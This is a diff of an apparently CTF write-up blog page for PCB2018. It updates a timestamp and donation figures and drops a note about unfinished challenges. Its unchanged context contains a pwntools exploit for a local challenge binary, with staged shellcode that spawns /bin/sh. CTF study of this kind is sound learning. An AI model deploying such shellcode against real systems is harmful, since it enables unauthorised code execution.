@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://wzt.ac.cn/image/pcb2018-8.png">
 <meta property="og:image" content="https://wzt.ac.cn/image/pcb2018-9.png">
 <meta property="article:published_time" content="2019-01-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-03-16T04:32:14.000Z">
+<meta property="article:modified_time" content="2024-06-07T01:32:56.382Z">
 <meta property="article:author" content="CataLpa">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wzt.ac.cn/image/pcb2018-1.png">
@@ -282,7 +282,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">p = process(&quot;./treasure&quot;)</span><br><span class="line">p.recvuntil(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">p.recvuntil(&quot;start!!!!&quot;)</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">                 push rdx</span><br><span class="line">                 pop rsi</span><br><span class="line">                 push 100</span><br><span class="line">                 pop rdx</span><br><span class="line">                 syscall</span><br><span class="line">                 ret</span><br><span class="line">                 &#x27;&#x27;&#x27;)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">shellcode_x64 = &#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line">print(len(shellcode_x64))</span><br><span class="line">p.sendline(shellcode_x64)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-<p>还剩下很多题目没有复现完，后面会陆续更新。</p>
 
     
 
@@ -636,7 +635,7 @@
                 
                   <i class="icon-link icon"></i>
                 
-                慢慢 捐赠了 ￥177
+                慢慢 捐赠了 ￥266
               </a>
             </li>
           
@@ -706,7 +705,7 @@
                 
                   <i class="icon-link icon"></i>
                 
-                匿名(c*0) 捐赠了 ￥6.66
+                匿名(c*0) 捐赠了 ￥33.32
               </a>
             </li>
           
